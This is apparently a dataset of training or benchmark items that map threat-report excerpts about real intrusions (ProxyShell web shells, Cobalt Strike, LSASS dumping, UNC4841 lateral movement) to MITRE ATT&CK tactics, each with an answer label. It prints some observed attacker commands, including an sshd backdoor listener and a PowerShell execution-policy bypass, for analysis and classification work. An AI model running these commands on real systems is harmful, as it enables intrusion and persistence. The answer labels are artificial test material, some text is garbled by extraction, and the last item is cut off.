[
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As reported by both Microsoft and Intel Security, the malware is installed in a very targeted manner and appears to be in use post-compromise. First, the attacker will gain unauthorized access to a victim network, then begin mapping out the network in order to move laterally and discover more potential victim hosts. Once the attacker has sufficiently found enough victim systems, SamSa is deployed manually, using common system administrator utilities, such as PSExec.\nAfter deploying the malware on various victim hosts, it will be installed using a RSA public key that is generated specifically for that particular attack. Additionally, a batch script is deployed that is responsible for deleting volume shadow copies on the victim machine to prevent restoration of files, executing SamSa, and finally self-destructing after successful encryption.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This time we will talk about ProxyShell, which revealed itself around August 2021. Once again, the vulnerability affects Microsoft Exchange servers. Specifically, the on-prem versions identified as Exchange Server 2013, Exchange Server 2016 and Exchange Server 2019. It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:\nCVE-2021-34473 \nCVE-2021-34523 \nCVE-2021-31207\nIn this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207). This last CVE allowed the creation of multiple web shells. The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:\nThis was shortly followed by the cmdlet \"New-ManagementRoleAssignment\" responsible for granting mailbox import/export privileges before running \"New-MailboxExportRequest\". The cmdlet would export a Mailbox to a provided location with the .aspx extention. While the file is a legitimate .pst file, in contains plaintext web shell code that is rendered by IIS when requested.\nBelow is an example of one of the IPs who successfully exploited the vulnerabilities:\nThree web shells were spotted during our investigation:\nThe login.aspx web shell is a simple web shell which takes a command and runs it using cmd.exe. We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that's why the parent process is w3wp. Here's what the web shell looked like:\nThis is the web shell code for login.aspx:\nThe other two web shells were dropped upon the successful exploitation of ProxyShell. Runningfilecommand on these two web shells, show that they are actually PST files that contain web shell:\nThe first web shell, aspx_qdajscizfzx.apsx, can upload files and runs cmd.exe:\nThe second web shell, aspx_gtonvbgidhh.apsx, can upload files and runs powershell.exe:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: FIN6 has traditionally conducted intrusions targeting payment card data from Point-of-Sale (POS) or eCommerce systems. This incident's targeting of the engineering industry would be inconsistent with that objective. However, we have recently identified multiple targeted Ryuk and LockerGoga ransomware incidents showing ties to FIN6, through both Mandiant incident response investigations and FireEye Intelligence research into threats impacting other organizations. We have traced these intrusions back to July 2018, and they have reportedly cost victims tens of millions of dollars. As the frequency of these intrusions deploying ransomware have increased, the cadence of activity traditionally attributed to FIN6-intrusions targeting point-of-sale (POS) environments, deploying TRINITY malware and sharing other key characteristics-has declined. Given that, FIN6 may have evolved as a whole to focus on these extortive intrusions. However, based on tactical differences between these ransomware incidents and historical FIN6 activity, it is also possible that some FIN6 operators have been carrying out ransomware deployment intrusions independently of the group's payment card breaches. Which of those scenarios is happening would influence how pressing a threat the group's card data breach tactics continue to be. Criminal operations and relationships are highly adaptable, so we commonly encounter such attribution challenges in regards to criminal activity. Given that these intrusions have been sustained for almost a year, we expect that continued research into further intrusion attempts may enable us to more fully answer these questions regarding FIN6's current status. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: No Command and Control frameworks were used during this intrusion. Initial access to the environment was performed using the web shell upon the exploitation of ProxyShell, then using valid accounts and Remote Desktop Services.\nThreat actors created a SSH tunnel to 148.251.71[.]182 usingplinkin order to forward RDP access:\nLooking at thisIP address on VirusTotal, we can observe that all \"Communicating Files\" related to it trigger FRP AV Signatures or Yara rules:We can conclude that those threat actors are used to this protocol tunneling technique.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial discovery by theIcedIDmalware occurred within minutes of execution:\nA flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead.\nWe believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.\nOnce on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.\nAdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.\nLater on, hands-on operators carried out some additional network and domain reconnaissance from the Cobalt Strike beacon. Again, built in utilities were favored, with the exception of what we assess was a fat finger or miss-paste by the threat actor entering a command they meant to execute in their Cobalt Strike console into the windows command terminal.\nThe threat actors executed AdFind multiple times on both the beachhead and the domain controllers through a well-known script called adf.bat.\nLater on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:\nThreat actor dropped and ran a script named ping.bat. Here's an example:\nThe threat actors utilized Advanced IP Scanner to the scan for open ports.\nOne of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder fromPowerSploitvia PowerShell ISE. They did the same thing later, on the second domain controller.\nOther Microsoft AD management PowerShell administration modules were also invoked by the threat actors for discovery tasks.\nFrom the Domain Controller the threat actor also ran aSeatbeltbinary, which was also seen in the Conti leak documents. This utility contains a number of \"safety checks\" on a host, telling the user about things like installed AV, network drives, local users, and much more.\nWe also noticed the threat actors searching for any existing antivirus software on the domain controller. They ran \"dir\" on the \"c:\\Program Files\\\" folder and saved the findings in the AV.txt file using a script named av.bat The script looked similar to the below:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1071: Application Layer Protocol   \nT1071.001: Web Protocols   \nT1071.004: DNS   \nT1090: Proxy   \nT1095: Non-Application Layer Protocol   \nT1102: Web Service   \nT1105: Ingress Tool Transfer   \nT1571: Non-Standard Port   \nT1573.001: Symmetric Cryptography   \nT1573.002: Asymmetric Cryptography ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the reconnaissance and credential harvesting stage, the attackers gather information about the system, the network - including the domain - and the installed software. Using a WMIC command, the attackers also collect information about the logical drives of the infected systems. \nThen, the attackers harvest and exfiltrate credentials. During the reconnaissance stage, the attackers specifically check if the RDP port is open. If it is and the attackers decrypt any of the harvested credentials, they would have direct access to the system without the need to install any other backdoor. The complete list of commands is provided in the table below. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Following Barracuda's public disclosure of CVE2023-2868, Mandiant identified UNC4841 performing internal reconnaissance and subsequent lateral movement actions within a limited number of victim environments. \nOn May 16, 2023, Mandiant observed the first evidence of UNC4841 attempting to perform internal reconnaissance on a small number of victims' internal networks in which Mandiant was responding. In these cases, the actor utilized opensource tools such as fscan to perform host detection, port scanning, web fingerprint identification, web vulnerability scanning, domain control identification, and other reconnaissance actions. In one environment, the actor scanned more than 50 subnets over the course of nine days, with approximately 80 percent of these being completed in one day. Figure 12 shows an example output from the fscan tool recovered from a compromised ESG appliance. \n<redacted>::25 open   \n<redacted>:25 open   \n<redacted>:587 open   \n<redacted>:443 open   \n[\\*] NetInfo:   \n[\\*]<redacted> [->]<redacted> [->]<redacted>   \n[\\*] WebTitle: https://<redacted> code   \n<redacted>:25 open   \n<redacted>:443 open   \n[\\*] LiveTop <redacted>/16 \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a:   \n[\\*] LiveTop <redacted>/16 \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a:   \n[\\*] LiveTop <redacted>/16 \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a:   \n<redacted>:25 open   \n<redacted>:587 open \nIn addition to the reconnaissance actions, Mandiant also observed UNC4841 attempting to move laterally from impacted ESG appliances within this same time period. Based on the activity observed over the course of the investigation, Mandiant believes UNC4841 was likely utilizing the contents of messages stored within the mstore, a temporary storage location on the ESG, to harvest credentials. In multiple instances, Mandiant identified cleartext credentials contained within the contents of messages stored on the ESG that UNC4841 subsequently used to successfully access the account through Outlook Web Access (OWA) on the first attempt. \nIn more than one case, Mandiant observed UNC4841 utilizing OWA to attempt to log in to mailboxes for users within the victim organization. In one case, a relatively low number of unsuccessful OWA access attempts resulted in the lockout of a limited number of accounts. In the cases where UNC4841 was able to obtain unauthorized access to a limited number of accounts, Mandiant did not observe UNC4841 send any email from the compromised account. Mandiant assesses that UNC4841 was likely attempting to maintain access to compromised users' mailboxes to gather information for espionage purposes post Barracuda remediation. \nIn addition to attempts to move laterally to Active Directory and OWA, Mandiant also observed attempts by UNC4841 to move laterally via SSH to VPNs, Proxy Servers, and other edge appliances on the victims network. \nMandiant also identified accounts created by UNC4841 within the etc/passwd file on roughly five percent of the previously impacted appliances, as another form of remote access. Account names followed a consistent format, containing four (4) randomly generated characters. The actor would then spawn a ssh daemon process to listen on a specific high port and allow login from this newly created user account as another means to maintain backdoor access to compromised appliances. An example of the command is shown as follows: \n/usr/sbin/sshd -p 48645 -oAllowUsers $=$ rfvN \nIn one case, Mandiant identified UNC4841 successfully accessing a Windows Server Update Services (WSUS) server utilizing a domain administrator account identified within the mstore on an ESG appliance. The access to WSUS is notable as Mandiant has observed other Chinanexus espionage actors deploying malware on a WSUS server to inject fake updates for remote code execution in efforts to steal data from government entities. ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In analyzing FinFisher, the first obfuscation problem that requires a solution is the removal of junk instructions and \"spaghetti code\", which is a technique that aims to confuse disassembly programs. Spaghetti code makes the program flow hard to read by adding continuous code jumps, hence the name. An example of FinFisher's spaghetti code is shown below. \nThis problem is not novel, and in common situations there are known reversing plugins that may help for this task. In the case of FinFisher, however, we could not find a good existing interactive disassembler (IDA) plugin that can normalize the code flow. So we decided to write our own plugin code using IDA Python. Armed with this code, we removed this first layer of anti-analysis protection. \nRemoving the junk instructions revealed a readable block of code. This code starts by allocating two chunks of memory: a global 1 MB buffer and one 64 KB buffer per thread. The big first buffer is used as index for multiple concurrent threads. A big chunk of data is extracted from the portable executable (PE) file itself and decrypted two times using a custom XOR algorithm. We determined that this chunk of data contains an array of opcode instructions ready to be interpreted by a custom virtual machine program (from this point on referenced generically as $^{\\prime\\prime}\\backslash{\\sf M}^{\\prime\\prime})$ implemented by FinFisher authors. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique : Indicator Removal on Host (T1070) \nATT&CK Technique : Indicator Removal on Host: Clear Windows Event Logs (T1070.001) \nATT&CK Technique : Masquerading: Match Legitimate Name or Location (T1036.005) \nATT&CK Technique : Impair Defenses: Disable or Modify System Firewall (T1562.004) \nATT&CK Technique : Modify Registry (T1112) ",
        "output": "defense evasion",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1003.003: NTDS T1003.008: /etc/passwd and /etc/shadow \nT1552.001: Credentials In Files T1552.006: Group Policy Preferences T1558: Steal or Forge Kerberos Tickets T1558.003: Kerberoasting T1606.001: Web Cookies ",
        "output": "credential access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As mentioned above, most APT41 attacks were conducted using Cobalt Strike. \nApplication Layer Protocol: Web Protocols  T1071.001 \nThe group used HTTP and HTTPS listeners to communicate with C&C servers. \nApplication Layer Protocol: DNS  T1071.004 \nTo hide all communication with C&C servers, the threat actors also used DNS tunnels. \nIngress Tool Transfer  T1105 \nThe threat actors used Cobalt Strike to upload their files to compromised devices. For certain targeted organizations, the group uploaded files from special directories named after the compromised organization. \nupload C:\\Users\\Administrator\\Desktop\\cs\\dns\\COMSysUpdate.ocx upload   \nC:\\Users\\Administrator\\Desktop\\webshell\\uploada4.aspx upload   \nc:\\users\\alex\\desktop\\smb.exe upload   \nC:\\Users\\Administrator\\Desktop\\cs\\SecurityHealthSystray.dll upload   \nC:\\Users\\Administrator\\Desktop\\cs\\install.bat upload   \nC:\\Users\\jack\\Desktop\\tmp\\cs_shell\\server\\install.bat upload   \nC:\\Users\\jack\\Desktop\\tmp\\cs_shell\\server\\bthsvc64.dll upload   \nC:\\Users\\jack\\Desktop\\tmp\\procdump64.exe upload C:\\Users\\jack\\Desktop\\   \n{redacted}\\244\\mciwave32.dll upload C:\\Users\\Admin\\Desktop\\   \n{redacted}\\HTTPS\\LxpSvc.exe upload C:\\Users\\Admin\\Desktop\\Webshell upload   \nC:\\Users\\Admin\\Desktop\\{redacted}\\webshell\\test4.aspx upload C:\\Users\\Admin\\Desktop\\ \nProxy: Internal Proxy  T1090.001 \nIn the attacks we analyzed, APT41 often used a tool for proxying traffic called FRPC. \nfrcp.exe -c frcp.ini ",
        "output": "command and control",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Reconnaissance is implemented in the first part of the BlueKeep plugin, which scans the network for hosts vulnerable to the BlueKeep vulnerability. ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This vulnerability has been assigned the CVE ID ofCVE-2022-0074.\nAfter gaining code execution on the server we wanted to take it a step further and escalate our privileges fromnobodytoroot.\nWhile exploring the OpenLiteSpeed Docker image asnobody, we found a misconfiguration in thePATHenvironment variable that could be exploited into a privilege escalation using the CWEuntrusted search path.\nWhen executing a binary with a relative path, the operating system will look at thePATHvariable, which contains a list of directories. It will then search for that binary in the listed folders, in the same order that the directories are presented.\nThe issue in this case was that the second directory inPATHwas/usr/local/bin, which is a directory that the usernobodycontrols.\nThis leads to a situation where an attacker could execute code as an unprivileged user (such asnobody) to place a malicious file and disguise it as a legitimate binary in/usr/local/bin, with the intention for it to be executed by highly privileged processes because it is in the second directory on thePATHenvironment variable.\nWe were able to exploit this by abusing the scriptentrypoint.shas shown in Figure 1, which runs asrootand executes the binarygreprepeatedly.\nBy chaining these vulnerabilities, we were able to gain remote code execution and escalate our privileges toroot, as shown in Figure 2.\nThis vulnerability requires the controlled user to have write permissions to/usr/local/bin, which is usually not the case by default. In the OpenLiteSpeed docker container, this directory is writable by the usernobodyby default.",
        "output": "privilege escalation",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: By Guilherme Venere \nTHURSDAY, JANUARY 19, 2023 08:00 \nAdversaries' shift toward Shell Link (LNK) files, likely sparked by Microsoft's decision to block macros, provides the opportunity to capitalize on information that can be provided by LNK metadata.   \nCisco Talos analyzed metadata in LNK files and correlated it with threat actors tactics techniques and procedures, to identify and track threat actor activity. This report outlines our research on Qakbot and Gamaredon as examples. \nTalos also used LNK file metadata to identify relationships among different threat actors. In this report we demonstrate this by using metadata to connect  Bumblebee with IcedID and Qakbot respectively. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ScreenConnect, Atera\nBeing installed as a service, ScreenConnect and Atera benefit from System-level permissions. Relying on services to obtain System-level permissions is an often-employed technique part of both legitimate tools (e.g.,PsExec's-s) and malicious ones (e.g.,Metasploit'sgetsystem).\nIdentifying service executions can be performed through both Sysmon's event1as well as the built-in Security event4688where the parent process isC:\\Windows\\System32\\services.exe. As can be seen in the following capture, these service executions run as localSYSTEM(SIDS-1-5-18).",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID ran initial discovery after being executed on the beachhead. Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc .\nAdditional discovery commands were executed by Cobalt Strike.\nAfter moving laterally to a domain controller, they began looking for what networks were present in the environment usingdsquery.\nShortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.) on systems residing in the same subnet.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor was able to RDP to a backup server using the admin credentials they acquired. Using the logs inMicrosoft-Windows-TerminalServices-LocalSessionManager/Operationalwe were able to determine the threat actor spent approximately 10 minutes on the backup server before disconnecting their RDP session. By doing this, they revealed the workstation name of the client:WIN-RRRU9REOK18.\nDuring that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content.\nProcess execution:\nSysmon Copy Paste Collection EID 24:\nAtomic\nComputed",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker was quite adept with Exchange and immediately listed various organization configuration settings via PowerShell. Below are a few of the operations that the attacker executed. \nGet a list of users on the Exchange server and their current role using GetManagementRoleAssignment: \nC:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command \"Get-ManagementRoleAssignment -GetEffectiveUsers | select Name,Role,EffectiveUserName,AssignmentMethod,IsValid | ConvertTo-Csv - NoTypeInformation | % {\\$_ -replace '\\`n','_'} | Out-File C:\\temp\\1.xml\" \nRetrieve information about the configured Virtual Directory using GetWebServicesVirtualDirectory: \nC:\\Windows\\system32\\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command \"Get-WebServicesVirtualDirectory | Format-List\" \nThe attacker also made use of a file called sqlceip.exe, which upon first glance might appear as the legitimate version of SQL Server Telemetry Client provided by Microsoft. However, Volexity determined this tool was actually a version of AdFind from joeware.net. AdFind is a command-line tool used for querying and extracting data from Active Directory. During the course of its investigations, Volexity discovered the attacker using AdFind with the following command line: \nC:\\Windows\\system32\\cmd.exe /C sqlceip.exe -default -f (name $|=^{\\prime}$ \"Organization Management\") member -list | sqlceip.exe -f objectcategory $\\v{m}=\\v{k}>$ .\\SettingSync\\log2.txt ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors were seen dumping credentials out of lsass memory across the domain.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The domain Administrator account was used throughout the network providing the actors easy access to all devices with local Administrator privileges.\nThis can be confirmed via event ID 4627 and looking for the group membershipS-1-5-21-domain-512. A full list of default sid's can be foundhere.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Discovery started with a port scan initiated by the Hancitor dll.\nAfter SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp. The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.\nThis was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.\nNotice above, the threat actors pinged 190.114.254[.]116 which is one of the Cobalt Strike servers they later used.\nThe threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.\nWe observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment. This script used the Active Directory RSAT module to get a list of computers and place them in a file named 'comps.txt.'\nA program named check.exe was observed using the comps.txt text file. This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP. The online hosts will then be directed to the check.txt text file.\nThe check.exe file contains three parameters that can be used one at a time:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique: Remote Services (T1021) ATT&CK Technique: Lateral Tool Transfer (T1570) \nOnce operational within the target environment, attackers will typically perform reconnaissance, identifying additional target systems, and then move laterally from system to system as they attempt to escalate privileges and then, ultimately, deploy ransomware on many systems in the environment. During the investigation, we observed the attacker leveraging Windows Remote Desktop Connections to pivot to additional systems in the environment. This was typically performed via the following command-line syntax: \nC:\\Windows\\system32\\mstsc.exe /v [HOSTNAME] \nThe attacker also attempted to execute PowerShell scripts on remote systems in the environment while moving system-to-system. \ncmd /c powershell.exe -ExecutionPolicy Bypass -file [IPADDRESS]\\share\\$\\p.ps1 \nDuring the attack, adversaries copied and executed the aforementioned PowerShell script on multiple systems across the environment. ",
        "output": "lateral movement",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Add persistence capabilities to a PowerShell script. \nNew-UserPersistenceOption - Configure user-level persistence options for the Add-Persistence functi New-ElevatedPersistenceOption - Configure elevated persistence options for the Add-Persistence func Add-Persistence - Add persistence capabilities to a script.   \nInstall-SSP - Installs a security support provider (SSP) dll.   \nGet-SecurityPackage - Enumerates all loaded security packages (SSPs). ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In our initial sample analysis, the C2 domain we observed was stgeorgebankers[.]com. After conducting pivots through malware samples, we were able to identify multiple C2 domains that date back to at least December 2019. These C2 domains were occasionally behind CloudFlare to obscure the real C2 IP address. Thanks to collaboration with our partners, we were able to gather some of the original C2 IP addresses, which allowed us to discover that the servers are hosted in Ukraine and Estonia. ",
        "output": "command and control",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LSASS DumpThe threat actors dumped LSASS process manually using the Task ManagerCAR-2019-08-001:\nTo facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Monitor your credit card bills so you will spot any suspicious transactions. You could even consider hiring the services of a credit monitoring company.\nOnly shop from well-known, secure websites and stores that are more likely to have good security measures in place. However, even well-known stores fall victim to cyber criminals, so while this may reduce your risk of exposure it doesn't eliminate it.",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We saw that the additionalsys.exebinary andldr.ps1PowerShell script was brought in to support the Mining operation from IP address194[.]145[.]227[.]21\nWe also observed connection from [kthreaddi].exe talking to crypto mining pools\nEventually, the crypto mining operation will cause performance issue with the WebLogic server.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Thegetsystem modulewas used to elevate access on the beachhead host.\nOn the second day, a Netlogon spike was observed from the beachhead host to a domain controller.\nThis spike was made up of various netlogon requests (NetrServerReqChallenge, NetrServerAuthenticate2, NetrServerPasswordSet2) from the beachhead host to the primary domain controller.\nA view of the traffic reveals that the threat actors had exploitedCVE 2020 1472,otherwise known as ZeroLogon. In the PCAP below, we can see the packet where the exploit succeeds in resetting the credential to all zeros.\nOn the domain controller, a 4742 event was generated showing the beachhead host changing the password on the domain controller, matching the timestamps to the network data.\nAfter exploiting Zerologon, the threat actors were also seen using Pass the Hash to begin working in the context of a user, who was a member of the Domain Admins group.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Trickbot\nCobalt Strike C2 #1\n147.135.78[.]200:80(Our Threat Feed service has known about this Cobalt Strike server since at least 4-4-2021)\nCS Config:\nCobalt Strike C2 #2\n23.108.57[.]39:443(Our Threat Feed service has known about this Cobalt Strike server since at least 4-12-2021)wideri[.]com\nCS Config:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LSASS AccessThe threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.The screenshot below shows the different \"DesiredAccess\" to the LSASS process object from different beacons (dllhost.exe, Edebef4.dll, etc.) or Task Manager:The table below maps the \"DesiredAccess\" values with the actualcorresponding access rights,and examples of credentials dumping tools requesting those accesses:\n*A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION. Those \"DesiredAccess\" values could be interesting to build detections or hunting queries if you are using Sysmon or such a verbose monitoring tool. In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The discovery of the bug in question starts with identifying the location of the stream names, enumerating instruction references to them, and then finding the common caller that is shared by each reference. This was done in the following screenshot using the IDA Python script which takes the list of selected addresses, fetches each of their executable references, groups each of them into separate sets and then finds the common intersection of all the sets. This results in a single function address being responsible for the selected stream names. \nAfter reviewing the function associated with the discovered address, 0x3BE25803, it appears to reference all of the stream names that were listed out of the empty document and are used as some form of initialization. Upon running the application with a breakpoint set to this address, our debugger will confirm that this code is executed upon opening the document. Examining the backtrace during the same debugging session then gives us a straightforward path to identify how the application parses streams from the document. \nThe function at 0x3BE25803 then has a single caller at 0x3C1FAF0F that can be navigated to in our disassembler. From this caller, each function that is called by it can be used to identify other places where stream names from the document are referenced. This is a common pattern that can be used to map each stream name to a function that is either responsible for parsing said stream or initializing the scope of variables that are later used when parsing the stream. \nint __thiscall object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be( object_9c2044 \\*this, JSVDA::object_OFRM \\*ap_oframe_0, int av_documentType_4, int av_flags_8, int av_whichStream_c, _DWORD \\*ap_result_10) \nconstructor_3a9de4(&lv_struc_38);   \nlv_result_4 = 0;   \nsub_3BE29547(lv_feh_60, 0xFFFF, 0);   \nlv_struc_38.v_documentType_8 = av_documentType_4;   \nlv_struc_38.v_initialParsingFlags_c = av_flags_8;   \nlv_struc_38.p_owner_24 = lp_this_64;   \nlv_struc_38.v_initialField(1)_10 = 1;   \nlv_position_7c = 4;   \nif ( av_whichStream_c == 1 || av_whichStream_c == 3 || av_whichStream_c == 4 )   \n{ v9 = \"DocumentViewStyles\";   \n}   \nelse   \n{ v9 = \"DocumentEditStyles\";   \n}   \nv10 = object_OFRM::openStreamByName?_132de4(lp_oframe_6c, v9, 16, &lp_oseg_68);   \nif ( v10 != 0x80030002 )   \n{ \\*(_QWORD \\*)&lp_oframe_70 = 0i64; if ( object_OSEG::setCurrentStreamPosition_1329ce(lp_oseg_68, 0, 0, 